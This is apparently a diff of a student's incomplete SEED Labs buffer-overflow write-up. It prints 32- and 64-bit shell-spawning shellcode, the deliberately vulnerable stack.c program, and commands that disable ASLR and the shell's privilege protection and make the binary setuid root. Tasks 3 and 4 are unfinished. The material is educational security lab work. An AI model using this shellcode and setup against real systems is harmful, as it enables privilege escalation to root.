@@ -1,12 +1,168 @@
 # Trabalho realizado na Semana #5 - SEED Labs - Buffer-Overflow Attack Lab (Set-UID Version)
 
-## Task 1
+To complete these tasks, we needed to disable the adress space randomization security mechanism, to make it easier to identify the adresses of the components and so that the address of the variables stay the same in each execution of a program
 
-## Task 2
+```
+$ sudo sysctl -w kernel.randomize_va_space=0
+```
 
-## Task 3
+Furthermore, since `/bin/dash` has an implemented security countermeasure that makes our attacks more difficult, we link `/bin/sh` to `/bin/zsh`, a shell that doesn't have such countermeasure and will let us create SET-UID attack programs
 
-## Task 4
+```
+$ sudo ln -sf /bin/zsh /bin/sh
+```
+
+## Task 1: Getting Familiar with Shellcode
+- We cannot just compile this code and use the binary code as our shellcode 
+
+1. Write a shellcode is to use assembly code. Given two versions, 32-bit and 64-bit
+
+2. Explaining how the 32.bit version works
+    - The third instruction pushes "//sh", rather than "/sh" into the stack. This is because we need a
+32-bit number here, and "/sh" has only 24 bits. Fortunately, "//" is equivalent to "/", so we can
+get away with a double slash symbol.
+    - We need to pass three arguments to execve() via the ebx, ecx and edx registers, respectively.
+The majority of the shellcode basically constructs the content for these three arguments.
+    - The system call execve() is called when we set al to 0x0b, and execute "int 0x80".
+
+**shellcode32:**
+```c
+; Store the command on stack
+xor eax, eax
+push eax
+push "//sh"
+push "/bin"
+mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument
+
+; Construct the argument array argv[]
+push eax ; argv[1] = 0
+push ebx ; argv[0] --> "/bin//sh"
+mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument
+
+; For environment variable
+xor edx, edx ; edx = 0: execve()’s 3rd argument
+
+; Invoke execve()
+xor eax, eax ;
+mov al, 0x0b ; execve()’s system call number
+int 0x80
+```
+
+3. The function to run the code assembly mencioned above was given to us:
+
+**call_shellcode.c**
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+const char shellcode[] = 
+#if __x86_64__
+    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+#else
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+#endif
+;
+
+int main(int argc, char **argv)
+{
+    char code[500];
+    strcpy(code, shellcode); // Copy the shellcode to the stack
+    int (*func)() = (int(*)())code;
+    func(); // Invoke the shellcode from the stack
+    return 1;
+}
+```
+
+4. We now compile it. If we add the -m32 flag, the 32 bit version will run, if we don't the 64-bit version will run.
+
+![Task1Make]()
+
+## Task 2: Understanding the Vulnerable Program
+
+1. They gave us the stack.c program:
+
+**stack.c:**
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Changing this size will change the layout of the stack.
+* Instructors can change this value each year, so students
+* won’t be able to use the solutions from the past. */
+#ifndef BUF_SIZE
+#define BUF_SIZE 100
+#endif
+
+int bof(char *str)
+{
+    char buffer[BUF_SIZE];
+
+    /* The following statement has a buffer overflow problem */
+    strcpy(buffer, str);
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+    printf("Returned Properly\n");
+    return 1;
+}
+```
+
+2. This program has a buffer overflow vulnerability. It reads an input with a max of 517 bytes, passes it to another buffer in the bof() function. But since the buffer in bof() can only retain less than 517 bytes, a buffer overflow will occur. Since the file that we are reading from has user access, we can alter it to achieve a root shell.
+
+3. Turn off the StackGuard and the non-executable stack protections using the -fno-stack-protector and "-z execstack"
+
+```
+$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
+```
+
+4. We need to make the program a root-owned Set-UID program so whe change the ownership of the program to root and then change the permission to 4777 to enable the SET-UID bit.
+
+```
+$ sudo chown root stack 
+$ sudo chmod 4755 stack 
+```
+
+5. A Makefile is already given, but we change the values of L1, L2 and L3, being L4 a fixed number. We opted for L1=100, L2=160 and L3=200
+
+6. We compiled it and checked the permissions, confirming the SET-UID bit
+
+![Task2Make]()
+![permissions]()
+
+
+## Task 3: Launching Attack on 32-bit Program (Level 1)
+
+1. We compiled and run the given program to see the adresses of the variables in the stack
+
+**gbd stack-L1-dbg:**
+![gbdStack]()
+
+**b bof and run:**
+![bBofAndRun]()
+
+**next:**
+![next]()
+
+**p $ebd and p &buffer:**
+![pEbdAndBuffer]()
+
+
+2.
+
+## Task 4: Launching Attack without Knowing Buffer Size (Level 2)
 
 
 
